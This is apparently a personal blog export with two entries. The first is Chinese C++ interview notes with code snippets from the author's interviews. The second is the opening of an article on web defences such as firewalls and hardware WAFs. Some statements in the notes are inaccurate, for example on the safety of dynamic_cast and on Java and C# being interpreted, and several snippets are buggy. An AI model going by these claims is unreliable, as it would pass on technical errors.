<h2 id="内存泄露"><a href="#内存泄露" class="headerlink" title="*内存泄露"></a>*内存泄露</h2><p>一般指堆的内存泄露，使用malloc、new分配完内存，使用完后，程序必须调用相应的free或delete释放该内存块，否则，这块内存就不能被访问，从而造成系统内存资源的浪费</p>
<h3 id="避免内存泄露："><a href="#避免内存泄露：" class="headerlink" title="避免内存泄露："></a>避免内存泄露：</h3><p>1.计数法:使用new或malloc时，该计数++，delete或free时，该计数–，程序执行完打印这个计数，不为0则存在内存泄露</p>
<p>2.将基类的析构函数声明为虚函数</p>
<p>3.保证new&#x2F;delete、malloc&#x2F;free的成对出现</p>
<p>4.智能指针自动化地管理动态分配的内存资源</p>
<h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><h3 id="reinterpret-cast"><a href="#reinterpret-cast" class="headerlink" title="reinterpret_cast"></a>reinterpret_cast</h3><p>reinterpret_cast (expression):type-id 必须是一个指针、引用、算术类型、函数指针或者成员指针。它可以用于类型之间进行强制转 换。</p>
<h3 id="const-cast"><a href="#const-cast" class="headerlink" title="const_cast"></a>const_cast</h3><p>const_cast (expression) 该运算符用来修改类型的const或volatile属性。除了const 或volatile修饰之外， type_id和expression的类型是一样的。 一般修改底指针</p>
<h3 id="static-cast"><a href="#static-cast" class="headerlink" title="static_cast"></a>static_cast</h3><p>static_cast &lt; type-id &gt; (expression) 该运算符把expression转换为type-id类型，但没有运行时类型检查来保证转换的安全性。</p>
<p>用于基本数据类型之间的转换，如把int转换成char，把int转换成enum。</p>
<h3 id="dynamic-cast"><a href="#dynamic-cast" class="headerlink" title="dynamic_cast"></a>dynamic_cast</h3><p>有类型检查，基类向派生类转换比较安全，但是派生类向基类转换则不太安全</p>
<p>dynamic_cast (expression) 该运算符把expression转换成type-id类型的对象。type-id 必须是类的指针、类的引用或者void*</p>
<h2 id="c-函数调用的压栈过程"><a href="#c-函数调用的压栈过程" class="headerlink" title="c++函数调用的压栈过程"></a>c++函数调用的压栈过程</h2><p>函数的调用过程：</p>
<p> 1）从栈空间分配存储空间 </p>
<p>2）从实参的存储空间复制值到形参栈空间 </p>
<p>3）进行运算</p>
<p>形参在函数未调用之前都是没有分配存储空间的，在函数调用结束之后，形参弹出栈空间，清除形参空间</p>
<p>数组作为参数的函数调用方式是地址传递，形参和实参都指向相同的内存空间，调用完成后，形参指针被销毁，但是所指向的内存空间依然存在，不能也不会被销毁</p>
<p>当函数有多个返回值的时候，不能用普通的 return 的方式实现，需要通过传回地址的形式进行，即地址&#x2F; 指针传递。</p>
<h2 id="浮点数比较"><a href="#浮点数比较" class="headerlink" title="浮点数比较"></a>浮点数比较</h2><p>浮点数的精度是有限，通过相减取绝对值，并与预设的精度比较</p>
<h2 id="类的对象建立"><a href="#类的对象建立" class="headerlink" title="类的对象建立"></a>类的对象建立</h2><p>main函数中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Test a;//静态建立，那就是存在栈上，销毁什么的自动</span><br><span class="line">Test *b=new Test();//因为new，那就是在堆上，new Test()返回是Test对象的指针，销毁需要手动delete</span><br></pre></td></tr></table></figure>

<h2 id="组合与继承"><a href="#组合与继承" class="headerlink" title="组合与继承"></a>组合与继承</h2><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>优点：子类重写父类方法实现扩展</p>
<p>缺点：</p>
<p>父类的内部细节对子类来说可见</p>
<p>是高耦合关系，如果父类的方法有修改，比如参数个数，子类必须做出相应调整</p>
<h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>将A类的对象作为B类的成员变量</p>
<p>优点：</p>
<p>所包含的对象的内部细节不可见</p>
<p>低耦合，修改了包含对象的代码，不需要修改当前对象类的代码</p>
<p>缺点：</p>
<p>容易产生过多的对象</p>
<p>必须对接口仔细定义</p>
<h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>意义：希望在同一个函数中通过<strong>使用相同的形参</strong>在<strong>不同的时间</strong>使用产生<strong>不同的效果</strong></p>
<p>函数指针指向的是特殊的数据类型，函数的类型是由其返回的数据类型和其参数列表共同决定的，而函数的名称则不是其类型的一部分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int (*pf)(const int&amp;, const int&amp;); </span><br></pre></td></tr></table></figure>

<p> 上面的pf就是一个函数指针，指向所有<strong>返回类型为int</strong>，并带有两个const int&amp;参数的函数。注意*pf两边的括号是必须的</p>
<p>否则就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *pf(const int&amp;, const int&amp;);</span><br></pre></td></tr></table></figure>

<p>而这声明了一个函数pf，其**返回类型为int ***， 带有两个const int&amp;参数。</p>
<h2 id="结构体变量比较相等"><a href="#结构体变量比较相等" class="headerlink" title="结构体变量比较相等"></a>结构体变量比较相等</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct foo &#123;</span><br><span class="line"> int a;</span><br><span class="line"> int b;</span><br><span class="line"> bool operator==(const foo&amp; rhs) *//* *操作运算符重载*</span><br><span class="line"> &#123;</span><br><span class="line"> return( a == rhs.a) &amp;&amp; (b == rhs.b);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="c-访问权限和继承权限"><a href="#c-访问权限和继承权限" class="headerlink" title="c++访问权限和继承权限"></a>c++访问权限和继承权限</h2><p>① public:用该关键字修饰的成员表示公有成员，该成员不仅可以在类内可以被访问，在类外也是可以被访问的，是类对外提供的可访问接口； </p>
<p>② private:用该关键字修饰的成员表示私有成员，该成员仅在类内可以被访问，在类体外是隐藏状态；</p>
<p> ③ protected:用该关键字修饰的成员表示保护成员，保护成员在类体外同样是隐藏状态，但是对于该类的派生类来说，相当于公有成员，在派生类中可以被访问。</p>
<p>三种继承方式 </p>
<p>① 若继承方式是public，基类成员在派生类中的访问权限保持不变，也就是说，基类中的成员访问权 限，在派生类中仍然保持原来的访问权限； </p>
<p>② 若继承方式是private，基类所有成员在派生类中的访问权限都会变为私有(private)权限；</p>
<p> ③ 若继承方式是protected，基类的共有成员和保护成员在派生类中的访问权限都会变为保护(protected) 权限，私有成员在派生类中的访问权限仍然是私有(private)权限。</p>
<h2 id="strcpy和memcpy的区别是什么"><a href="#strcpy和memcpy的区别是什么" class="headerlink" title="strcpy和memcpy的区别是什么"></a>strcpy和memcpy的区别是什么</h2><p>1、复制的内容不同。</p>
<p>strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。 </p>
<p>2、复制的方法不同。</p>
<p><strong>strcpy</strong>不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以<strong>容易溢出</strong>。memcpy则是根据其第3个参数决定复制的长度。 </p>
<p>3、用途不同。</p>
<p>通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</p>
<h2 id="空类，默认添加哪些函数"><a href="#空类，默认添加哪些函数" class="headerlink" title="*空类，默认添加哪些函数"></a>*空类，默认添加哪些函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Empty(); // 缺省构造函数//</span><br><span class="line">2) Empty( const Empty&amp; ); // 拷贝构造函数//</span><br><span class="line">3) ~Empty(); // 析构函数//</span><br><span class="line">4) Empty&amp; operator=( const Empty&amp; ); // 赋值运算符//</span><br></pre></td></tr></table></figure>

<h2 id="静态绑定与动态绑定"><a href="#静态绑定与动态绑定" class="headerlink" title="静态绑定与动态绑定"></a>静态绑定与动态绑定</h2><p>对象的静态类型：对象在声明时采用的类型，编译期确定</p>
<p>对象的动态类型：目前所指对象的类型。运行期觉得，对象的动态类型可以更改，静态类型无法更改</p>
<p>静态绑定：绑定对象静态类型</p>
<p>动态绑定：</p>
<h2 id="C-中哪些运算符不能重载？"><a href="#C-中哪些运算符不能重载？" class="headerlink" title="C++中哪些运算符不能重载？"></a><strong>C++中哪些运算符不能重载？</strong></h2><p>1 .（成员访问运算符）<br>2 .*（成员指针访问运算符）<br>3 ::（域运算符）<br>4 sizeof关键字<br>5 ?:（条件运算符）</p>
<h2 id="c-编译模块是什么"><a href="#c-编译模块是什么" class="headerlink" title="c++编译模块是什么"></a>c++编译模块是什么</h2><h2 id="什么是全局静态变量和局部静态变量"><a href="#什么是全局静态变量和局部静态变量" class="headerlink" title="什么是全局静态变量和局部静态变量"></a>什么是全局静态变量和局部静态变量</h2><h2 id="c-线程池"><a href="#c-线程池" class="headerlink" title="c++线程池"></a>c++线程池</h2><h2 id="技术面（gg）"><a href="#技术面（gg）" class="headerlink" title="技术面（gg）"></a>技术面（gg）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char a[] = &quot;hello world&quot;;</span><br><span class="line">   char *p = a;</span><br><span class="line">   cout &lt;&lt; sizeof(a) &lt;&lt; endl; </span><br><span class="line">   cout &lt;&lt; sizeof(p) &lt;&lt; endl;</span><br><span class="line">   return 0;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>char a[]相当于string，所以，字符串长度+”\0”的长度为11+1&#x3D;12</p>
<p>第二个sizeof是指针的大小，一般为8字节</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行以下语句会有什么结果</span><br><span class="line">char a[] = “hello”;</span><br><span class="line">a[0] = ‘X’;</span><br><span class="line"></span><br><span class="line">char *p = “world”;</span><br><span class="line">p[0] = ‘X’; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>前两行没问题</p>
<p>后两行，字符串常量通常被存储在只读的内存区域，不能修改</p>
<p>后两行运行时，会给出警告，但p[1]，p[0]是可以访问的</p>
</blockquote>
<blockquote>
<p>1,4,7,11,15<br>2,5,8,12,19<br>3,6,9,16,22<br>10,13,14,17,24<br>18,21,23,26,30</p>
</blockquote>
<p>有个MN矩阵，每一行每一列升序，用最优解找数字</p>
<p>思想：要么左下角，要么右上角开始找</p>
<p>下面代码以右上角开始：</p>
<p>如果a[row][col]&gt;t呢，说明在左边col–</p>
<p>否则呢，说明在下边row++</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool jisuan(vector&lt;vector&lt;int&gt; &gt; a, int t)</span><br><span class="line">&#123;</span><br><span class="line">    // for (auto we : a)</span><br><span class="line">    //     for (auto we1 : we)</span><br><span class="line">    //     &#123;</span><br><span class="line">    //         if (we1 == t)</span><br><span class="line">    //             return true;</span><br><span class="line">    //     &#125;</span><br><span class="line">    // return false;</span><br><span class="line">       int row=a.size(),col=a[0].size();</span><br><span class="line">       int minv=min(row,col);</span><br><span class="line"></span><br><span class="line">       row=0;col=col-1;</span><br><span class="line">       while (row &lt;a.size() &amp;&amp; col &gt;= 0)</span><br><span class="line">       &#123;</span><br><span class="line">            if(a[row][col]==t) return true;</span><br><span class="line">            else if(a[row][col]&gt;t) col--;</span><br><span class="line">            else row++;</span><br><span class="line">       &#125;</span><br><span class="line">       return false;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt; a;</span><br><span class="line"></span><br><span class="line">    string s;</span><br><span class="line">    while (1)</span><br><span class="line">    &#123;</span><br><span class="line">        getline(cin, s);</span><br><span class="line">        if(s.empty()) break;</span><br><span class="line">        stringstream ss(s);</span><br><span class="line">        string t;</span><br><span class="line">        vector&lt;int&gt; b;</span><br><span class="line">        while (getline(ss, t, &#x27;,&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            b.push_back(stoi(t));</span><br><span class="line">        &#125;</span><br><span class="line">        a.push_back(b);</span><br><span class="line">       // if (s.size() == 0)</span><br><span class="line">    //    if(s.empty()) //如果判断空行放在这里，到时候输入的t是不存在的值时，不会输出false;</span><br><span class="line">    //         break;</span><br><span class="line">    &#125;</span><br><span class="line">    int t;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bool flag=jisuan(a, t);</span><br><span class="line">    if (flag)</span><br><span class="line">    &#123;</span><br><span class="line">          cout &lt;&lt; &quot;true&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; &quot;false&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1,4,7,11,15<br>2,5,8,12,19<br>3,6,9,16,22<br>10,13,14,17,24<br>18,21,23,26,30</p>
<p>28</p>
<p>输出false</p>
</blockquote>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>任何东西都不是速成的，知识需要时间去检验，空有理论，没有实际应用，白搭</p>
<h2 id="技术二面-gg"><a href="#技术二面-gg" class="headerlink" title="技术二面(gg)"></a>技术二面(gg)</h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h3><p>关键字friend</p>
<p><a href="http://t.csdn.cn/Oa7kU">CSDN</a></p>
<h3 id="一个空类会自动初始化多少函数"><a href="#一个空类会自动初始化多少函数" class="headerlink" title="一个空类会自动初始化多少函数"></a>一个空类会自动初始化多少函数</h3><p>除了构造和析构</p>
<p>还有拷贝构造函数</p>
<p>复制运算符</p>
<h3 id="赋值初始化和拷贝初始化-记不清了"><a href="#赋值初始化和拷贝初始化-记不清了" class="headerlink" title="赋值初始化和拷贝初始化(记不清了)"></a>赋值初始化和拷贝初始化(记不清了)</h3><h3 id="基类的析构函数设置为虚函数有什么用"><a href="#基类的析构函数设置为虚函数有什么用" class="headerlink" title="基类的析构函数设置为虚函数有什么用"></a>基类的析构函数设置为虚函数有什么用</h3><p>释放基类的析构函数同时，释放派生类的析构函数</p>
<h3 id="栈和队列区别"><a href="#栈和队列区别" class="headerlink" title="栈和队列区别"></a>栈和队列区别</h3><p>栈先进后出；队列先进先出</p>
<p>栈表的一端插入和删除；队列一端进一端出</p>
<p>栈只能取顶部元素，遍历数据的同时要为数据开辟临时空间；队列无需开辟空间，遍历速度稍快</p>
<h3 id="能重载吗"><a href="#能重载吗" class="headerlink" title="*能重载吗"></a>*能重载吗</h3><p>不可以</p>
<h3 id="操作符重载用过吗"><a href="#操作符重载用过吗" class="headerlink" title="操作符重载用过吗"></a>操作符重载用过吗</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool operator()(pair&lt;int,int&gt; &amp;a, pair&lt;int,int&gt;&amp;b)&#123;</span><br><span class="line">      return a.second &lt; b.second;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h3 id="static在类里，在类外，有什么区别"><a href="#static在类里，在类外，有什么区别" class="headerlink" title="static在类里，在类外，有什么区别"></a>static在类里，在类外，有什么区别</h3><p>类里的static存在哪里，存在<strong>数据段</strong>。</p>
<h3 id="析构函数如果，会发生什么-记不清了"><a href="#析构函数如果，会发生什么-记不清了" class="headerlink" title="析构函数如果，会发生什么(记不清了)"></a>析构函数如果，会发生什么(记不清了)</h3><p>崩溃</p>
<h3 id="C-为什么面向对象-具体说明一下"><a href="#C-为什么面向对象-具体说明一下" class="headerlink" title="C++为什么面向对象(具体说明一下)"></a>C++为什么面向对象(具体说明一下)</h3><p>我答的是多态、封装和继承，这是特点</p>
<p>面向过程：主要是指功能的行为，以函数为单位，怎么做</p>
<blockquote>
<p>把大象关进冰箱</p>
<p>1.开箱</p>
<p>2.把大象关进去</p>
<p>3.关箱</p>
</blockquote>
<p>面向对象：主要是指具备了功能的对象，考虑谁去做</p>
<blockquote>
<p>三个主体：人、冰箱、大象</p>
<p>冰箱{</p>
<p>​	open(){}</p>
<p>​	close(){}</p>
<p>};</p>
<p>大象{</p>
<p>​	进冰箱(){}</p>
<p>};</p>
<p>人{</p>
<p>​	打开(冰箱){</p>
<p>​	冰箱.open();</p>
<p>}</p>
<p>​	送(大象){</p>
<p>​	大象.进冰箱();</p>
<p>}</p>
<p> 关闭(冰箱){</p>
<p>​	冰箱.close():</p>
<p>}</p>
<p>};</p>
</blockquote>
<h3 id="继承是什么关系"><a href="#继承是什么关系" class="headerlink" title="继承是什么关系"></a>继承是什么关系</h3><p>子类与父类之间的关系是“是一个”（is-a）关系，即子类是父类的一种特殊类型</p>
<h3 id="嵌套和继承的区别"><a href="#嵌套和继承的区别" class="headerlink" title="嵌套和继承的区别"></a>嵌套和继承的区别</h3><p>嵌套类是一个在另一个类的内部定义的类。它在外部类中具有作用域限制，可以访问外部类的私有成员。嵌套类通常用于实现某个类的内部辅助功能或数据结构。这可以帮助保持代码的整洁性，因为嵌套类的实现细节不会暴露给外部世界。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Outer &#123;</span><br><span class="line">public:</span><br><span class="line">    class Nested &#123;</span><br><span class="line">    public:</span><br><span class="line">        void nestedMethod() &#123;</span><br><span class="line">            // 可以访问外部类的成员</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">    int privateMember;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    Outer::Nested nestedObj;</span><br><span class="line">    nestedObj.nestedMethod();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="写个双向链表的插入实现-gg"><a href="#写个双向链表的插入实现-gg" class="headerlink" title="写个双向链表的插入实现(gg)"></a>写个双向链表的插入实现(gg)</h3><p>哇，基础不牢，地动山摇</p>
<p>双向链表的实现，惭愧，这个基础没记住</p>
<p>当时写的这玩意儿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List* insert(List* head,int p,int q)</span><br><span class="line">   &#123;</span><br><span class="line">       List* p1=head;</span><br><span class="line">       while(p1)</span><br><span class="line">       &#123;</span><br><span class="line">           if(p1&gt;val==p)</span><br><span class="line">           &#123;</span><br><span class="line">           /*h-&gt;p&lt;-q----&gt;h</span><br><span class="line">              &lt;- -&gt;</span><br><span class="line">               */</span><br><span class="line">               List* p2=new List(q);</span><br><span class="line">               /* p-&gt;end</span><br><span class="line">                   </span><br><span class="line">                    */</span><br><span class="line">               </span><br><span class="line">               p1-&gt;end=p2;</span><br><span class="line">               p2-&gt;pre=p1;</span><br><span class="line">               p2-&gt;end=head;</span><br><span class="line">               p2=nullptr;</span><br><span class="line">               break;</span><br><span class="line">           &#125;</span><br><span class="line">           p1=p1-&gt;end;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230812222457210.png" alt="image-20230812222457210"></p>
<p>以插入角度来讲，p后面加入q，我们考虑一下，在p与p-&gt;next结点中间插入q，需要满足什么</p>
<blockquote>
<p>q结点与p-&gt;next结点先完成互指：</p>
<p>p-&gt;next-&gt;pre&#x3D;q;</p>
<p>q-&gt;next&#x3D;p-&gt;next;</p>
<p>p结点再与q结点完成互指：</p>
<p>p-&gt;next&#x3D;q;</p>
<p>q-&gt;pre&#x3D;p;</p>
</blockquote>
<p>如果p是第一个节点怎么办捏</p>
<blockquote>
<p>q-&gt;next&#x3D;nullptr;</p>
<p>p-&gt;next&#x3D;q;</p>
<p>q-&gt;pre&#x3D;p;</p>
</blockquote>
<p>如果p是尾结点</p>
<blockquote>
<p>List* tem&#x3D;p-&gt;pre;</p>
<p>p-&gt;pre&#x3D;q;</p>
<p>p-&gt;next&#x3D;nullptr;</p>
<p>tem-&gt;next&#x3D;q;</p>
<p>q-&gt;pre&#x3D;tem;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List* insert(List* &amp;head,int p,int q)</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        List* p1=head;</span><br><span class="line">        while(p1-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            if(p1-&gt;val==p)</span><br><span class="line">            &#123;</span><br><span class="line">                List* qq=new List(q);</span><br><span class="line">                p1-&gt;next-&gt;pre=qq;</span><br><span class="line">                qq-&gt;next=p1-&gt;next;</span><br><span class="line"></span><br><span class="line">                qq-&gt;pre=p1;</span><br><span class="line">                p1-&gt;next=qq;</span><br><span class="line"></span><br><span class="line">                return head;</span><br><span class="line">            &#125;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>完善判空，还有尾结点情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!head) &#123;</span><br><span class="line">       head = new List(0);</span><br><span class="line">       head-&gt;next = head;</span><br><span class="line">       head-&gt;pre = head;</span><br><span class="line">       return head;</span><br><span class="line">   &#125;</span><br><span class="line">    List* p1=head;</span><br><span class="line">       while(p1-&gt;next)</span><br><span class="line">       &#123;</span><br><span class="line">           if(p1-&gt;val==p)</span><br><span class="line">           &#123;</span><br><span class="line">               List* qq=new List(q);</span><br><span class="line">               qq-&gt;next=p1-&gt;next;</span><br><span class="line">               qq-&gt;pre=p1;</span><br><span class="line">			</span><br><span class="line">			if(p1-&gt;next)&#123;</span><br><span class="line">			p1-&gt;next-&gt;pre=qq;</span><br><span class="line">			&#125;</span><br><span class="line">               p1-&gt;next=qq;</span><br><span class="line"></span><br><span class="line">               return head;</span><br><span class="line">           &#125;</span><br><span class="line">           p1=p1-&gt;next;</span><br><span class="line">       &#125;</span><br><span class="line">       return head;</span><br><span class="line">   </span><br></pre></td></tr></table></figure>



<h3 id="来个判断字符串包含-gg"><a href="#来个判断字符串包含-gg" class="headerlink" title="来个判断字符串包含(gg)"></a>来个判断字符串包含(gg)</h3><p>哇，基础不牢，地动山摇</p>
<p>当时脑抽写了这个，啧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=0;i&lt;s1.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">       st.insert(s1[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   for(int i=0;i&lt;s2.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">       if(st.count(s2[i])) tem+=st-&gt;first;</span><br><span class="line">   &#125;</span><br><span class="line">   if(tem==s2) return true;</span><br><span class="line">   return false;</span><br></pre></td></tr></table></figure>

<p>之后口头的时候提到了substr函数的实现方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=0;i&lt;s1.size();i++)</span><br><span class="line"> &#123;</span><br><span class="line">      if(s1.substr(i,s2.size())==s2) return true;</span><br><span class="line"> &#125;</span><br><span class="line"> return false;</span><br></pre></td></tr></table></figure>



<h2 id="c-标准库函数有了解吗"><a href="#c-标准库函数有了解吗" class="headerlink" title="c++标准库函数有了解吗"></a>c++标准库函数有了解吗</h2><p>stl嘛，容器那些，面试官只是回了：行</p>
<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>空中楼阁；基础不牢，地动山摇</p>
<p>c++的应用，面试官说是很多，鸿蒙开发就是c；至于桌面应用是应用层的关系</p>
<p>面试官说，设计模式的重要性；基础掌握；思想逻辑；算法一定要知道基础；系统设计框架：生产者和消费者</p>
<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h1 id="来源-1"><a href="#来源-1" class="headerlink" title="来源"></a>来源</h1><p>CSDN博主<a href="https://blog.csdn.net/Lushengshi/article/details/127580635">「丘比特惩罚陆」</a></p>
<p>知识补充来源：<a href="https://zhuanlan.zhihu.com/p/553387258">知乎笔记</a></p>
<p>为什么c++很少用于后端开发：</p>
<p>与java和python相比，c++缺乏像Spring和Django这种web框架，也没有一个像 J2EE 或 Servlet API 这样的标准。</p>
<p>c++适用于高性能和实时系统，如游戏开发、图形处理和科学计算等领域</p>
<p>而Web后端开发的重点是数据处理和业务逻辑</p>
<p>此外，web开发的工作是处理字符串，比如url，http头啊，输出的html、js啊，确实其它的语言，java、c#或者是python，处理字符串很容易，都有自带的库，随便调用一下，比如split这种方法。c++明显在这方面弱</p>
<p>说是没有自动垃圾回收器，即GC</p>
<p>然后嘞，web开发的都是解释性语言，c#,java等，解释性语言移植性要高些，c++这种编译性依赖特定平台</p>
<p>对计算量大又想高效的前后端应用，C++可能会合适。且Web Assembly已经全面落户最新的Chrome、Firefox、Edge、Safari等主流浏览器。可以将C++源码编译成wasm二进制文件直接在浏览器里高速运行（使用Emscripten编译更加便捷）。对很多前端应用来说，使用C++加速可能并没有必要。但是如果想要在前端产品中加入机器视觉，自然语言处理，机器学习等模块，WebAssembly将成为一个极好的选择。</p>
<p><a href="https://www.zhihu.com/question/26782196/answer/2946648596?utm_id=0">知乎</a></p>
<p><a href="https://six.club/article/2775">sixclub</a></p>
]]></content>
      <categories>
        <category>C++知识点</category>
      </categories>
      <tags>
        <tag>C++知识点</tag>
        <tag>面经</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB防护技术与体系</title>
    <url>/2023/06/12/WEB%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%8E%E4%BD%93%E7%B3%BB/</url>
    <content><![CDATA[<p>基本安全防护手段，比如防火墙的部署，防火墙通常部署在网络出口，用以对网络内外交互的行为进行过滤，过滤规则基于五元组“源IP、目的IP、源MAC、目的MAC、端口号”。这种简单粗暴的过滤方式在早期行之有效。</p>
<p>但是，由于Web应用依托于应用层的HTTP\HTTPS进行开展，应用层对之下各层表现为同一端口，因此导致利用防火墙来为Web应用提供防护基本无效。主要原因是在传统防护规范中，基于TCP&#x2F;IP的<strong>五元组位于OSI七层框架中第二、三、四层</strong>（TCP&#x2F;IP模型的前三层），<strong>而Web应用位于OSI第七层</strong>（TCP&#x2F;IP模型第四层）</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152924286.png"></p>
<p>防火墙对Web应用层面的攻击（SQL注入、XSS、upload等）基本没有防护效果。因此，利用防火墙只能对<strong>网络的边界处</strong>提供通用防护，但无法针对Web应用进行防护。目前，下一代防火墙（Next Generation Firewall）可以实现针对应用层威胁的防护。因此这里所说的防火墙是指<strong>传统的包过滤防火墙</strong>。</p>
<h1 id="1-硬件WAF"><a href="#1-硬件WAF" class="headerlink" title="1.硬件WAF"></a>1.硬件WAF</h1><p>硬件WAF在部署时会<strong>尽可能靠近需要防护的Web服务器，并放置在Web服务器之前，采用串联的方式部署在网络中</strong>。很多情况下，WAF需要同时支持对多台服务器的防护，这时候可<strong>利用路由策略将HTTP流量引入WAF，待WAF检测完成后再发送给服务器。</strong>WAF<strong>重点针对进出Web服务器的HTTP流量进行过滤</strong>，并针对HTTP流量中的攻击行为采取阻断或告警措施。由于攻防技术不断演进，WAF系统也会定期升级，并更新各类防护策略及漏洞插件，以适应日益变更的网络攻防形态。</p>
<p>WAF在防护方面主要有以下两个比较具有争议的特点。</p>
<blockquote>
<p><strong>1.代理模式</strong></p>
<p>这种模式下，将设备部署在Web服务器前端，可将Web网站缓存到设备中，并由WAF对用户的Web请求进行响应。而且，WAF也会定期对Web网站页面进行检查，确认网站是否安全，是否存在篡改行为等。此模式在设计之初预期非常好，希望WAF充当用户与站点之间的缓冲带。但由于WAF本身并不参与Web系统服务器的工作，因此当面对用户的交互请求时，仍会由被防护的Web服务器进行响应。因此，在实际工作中开启此模式的WAF设备也相对较少。</p>
</blockquote>
<blockquote>
<p><strong>2.在线攻击防护效果</strong></p>
<p>WAF设计之初的目标就是针对SQL注入、XSS等在线攻击行为进行防护。WAF<strong>常用的方式是利用关键字匹配</strong>，通过内置的Web漏洞及攻击行为特征对用户请求进行检测。这样做的问题是误报率较高，且会阻断正常用户行为。目前，新型的WAF设备具备了自学习及类似功能，可利用<strong>机器学习的方式来扩展防护的规则库</strong>，防护效果有较明显的提升。</p>
</blockquote>
<p>WAF的额外功能很多，如爬虫检测功能、DDoS攻击识别功能、漏洞专项防护等。但是其标准防护技术就是疑似行为匹配。<strong>WAF内部会建立大量的规则库，</strong>涵盖各种漏洞类型的常见攻击特征、关键代码等。然后，利用正则表达式实现快速识别。当然，也会针对高危漏洞编写特定检测插件，以便精确识别当前攻击并做出防护。</p>
<p>硬件WAF的防护思路及方案非常适合为互联网的Web应用提供防护，但事实并非如此。通常来说，WAF的性能最高能够达到Gbps级别，这主要取决于检查深入程度及设备延迟。设备延迟过高会对用户体验造成极大的影响。同时作为一款硬件设备，WAF需部署在Web服务器前端，这样在网络内就形成了一个单点情况，俗称“单点故障点”。在这种情况下，如果WAF出现硬件、系统故障情况，极可能导致网络中断。</p>
<p>为了解决这个问题，目前WAF产品均具有<strong>双机热备&#x2F;互备功能。</strong>依赖于通用的VRRP热备协议或其他标准，在网络内可实现多台设备的相互虚拟，由协议自动监控设备状态并自动切换链路。同时设备支持硬&#x2F;软件bypass（一种断电网络连通机制，避免由于设备宕机后网络中断），采取双电源等模式，尽可能保障网络的通畅。在设备实际部署中，需根据真实的服务情况进行合理的网络配置，</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619162122751.png" alt="WAF在线部署示意图"></p>
<h2 id="1-1常用的防护规则"><a href="#1-1常用的防护规则" class="headerlink" title="1.1常用的防护规则"></a>1.1常用的防护规则</h2><p>有效的防护规则是WAF识别和阻止已知攻击的主要检测手段，也是WAF在线识别攻击的重要保证。标准的WAF规则所提供的防护功能主要包括以下方面：</p>
<p>1.针对用户行为的识别</p>
<blockquote>
<p>·在线爬虫识别</p>
<p>·用户访问频率及特征</p>
<p>·DDoS识别</p>
</blockquote>
<p>2.基础攻击的防护</p>
<blockquote>
<p>·SQL注入防护</p>
<p>·XSS（跨站脚本）攻击防护</p>
<p>·跨站请求伪造防护</p>
